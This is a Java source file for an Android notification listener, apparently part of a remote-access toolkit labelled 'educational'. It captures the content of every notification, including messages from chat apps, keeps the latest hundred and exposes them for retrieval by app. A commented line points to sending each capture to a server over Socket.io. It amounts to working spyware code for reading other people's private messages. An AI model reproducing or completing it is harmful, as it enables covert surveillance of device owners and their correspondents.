package com.remoteaccess.educational.advanced;

import android.app.Notification;
import android.content.Context;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

/**
 * NOTIFICATION INTERCEPTOR - Read All Notifications
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY
 * 
 * FEATURES:
 * - Intercept all notifications
 * - Read notification content
 * - Extract messages
 * - Monitor apps
 * - Real-time notification tracking
 * 
 * REQUIRES:
 * - Notification Listener Service permission
 * - User must enable in Settings
 * 
 * USE CASES:
 * - Message monitoring
 * - App activity tracking
 * - Security analysis
 * - Educational research
 */
public class NotificationInterceptor extends NotificationListenerService {

    private static NotificationInterceptor instance;
    private static List<JSONObject> notifications = new ArrayList<>();
    private static final int MAX_NOTIFICATIONS = 100;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            JSONObject notification = extractNotificationData(sbn);
            
            // Add to list
            synchronized (notifications) {
                notifications.add(0, notification); // Add at beginning
                
                // Keep only last 100 notifications
                if (notifications.size() > MAX_NOTIFICATIONS) {
                    notifications.remove(notifications.size() - 1);
                }
            }
            
            // You can send this to server via Socket.io
            // SocketManager.getInstance().sendNotification(notification);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        // Notification removed
    }

    /**
     * Extract notification data
     */
    private JSONObject extractNotificationData(StatusBarNotification sbn) {
        JSONObject data = new JSONObject();
        
        try {
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            
            // Basic info
            data.put("packageName", sbn.getPackageName());
            data.put("postTime", sbn.getPostTime());
            data.put("id", sbn.getId());
            data.put("tag", sbn.getTag());
            data.put("key", sbn.getKey());
            
            // App name
            try {
                Context context = getApplicationContext();
                String appName = context.getPackageManager()
                    .getApplicationLabel(context.getPackageManager()
                    .getApplicationInfo(sbn.getPackageName(), 0))
                    .toString();
                data.put("appName", appName);
            } catch (Exception e) {
                data.put("appName", sbn.getPackageName());
            }
            
            // Notification content
            if (extras != null) {
                data.put("title", extras.getString(Notification.EXTRA_TITLE, ""));
                data.put("text", extras.getString(Notification.EXTRA_TEXT, ""));
                data.put("subText", extras.getString(Notification.EXTRA_SUB_TEXT, ""));
                data.put("bigText", extras.getString(Notification.EXTRA_BIG_TEXT, ""));
                data.put("infoText", extras.getString(Notification.EXTRA_INFO_TEXT, ""));
                data.put("summaryText", extras.getString(Notification.EXTRA_SUMMARY_TEXT, ""));
                
                // Messages (for messaging apps)
                if (extras.containsKey(Notification.EXTRA_MESSAGES)) {
                    data.put("messages", extras.get(Notification.EXTRA_MESSAGES).toString());
                }
            }
            
            // Category
            if (notification.category != null) {
                data.put("category", notification.category);
            }
            
            // Priority
            data.put("priority", notification.priority);
            
            // Flags
            data.put("ongoing", (notification.flags & Notification.FLAG_ONGOING_EVENT) != 0);
            data.put("autoCancel", (notification.flags & Notification.FLAG_AUTO_CANCEL) != 0);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return data;
    }

    /**
     * Get all intercepted notifications
     */
    public static JSONObject getAllNotifications() {
        JSONObject result = new JSONObject();
        
        try {
            JSONArray notifArray = new JSONArray();
            
            synchronized (notifications) {
                for (JSONObject notification : notifications) {
                    notifArray.put(notification);
                }
            }

            result.put("success", true);
            result.put("notifications", notifArray);
            result.put("count", notifArray.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get notifications from specific app
     */
    public static JSONObject getNotificationsFromApp(String packageName) {
        JSONObject result = new JSONObject();
        
        try {
            JSONArray notifArray = new JSONArray();
            
            synchronized (notifications) {
                for (JSONObject notification : notifications) {
                    if (notification.getString("packageName").equals(packageName)) {
                        notifArray.put(notification);
                    }
                }
            }

            result.put("success", true);
            result.put("packageName", packageName);
            result.put("notifications", notifArray);
            result.put("count", notifArray.length());
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Clear all notifications
     */
    public static JSONObject clearAllNotifications() {
        JSONObject result = new JSONObject();
        
        try {
            synchronized (notifications) {
                notifications.clear();
            }

            result.put("success", true);
            result.put("message", "All notifications cleared");
            
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (JSONException ex) {
                ex.printStackTrace();
            }
        }
        
        return result;
    }

    /**
     * Get instance
     */
    public static NotificationInterceptor getInstance() {
        return instance;
    }

    /**
     * Check if service is enabled
     */
    public static boolean isEnabled(Context context) {
        String enabledListeners = android.provider.Settings.Secure.getString(
            context.getContentResolver(),
            "enabled_notification_listeners"
        );
        
        if (enabledListeners != null) {
            return enabledListeners.contains(context.getPackageName());
        }
        
        return false;
    }
}
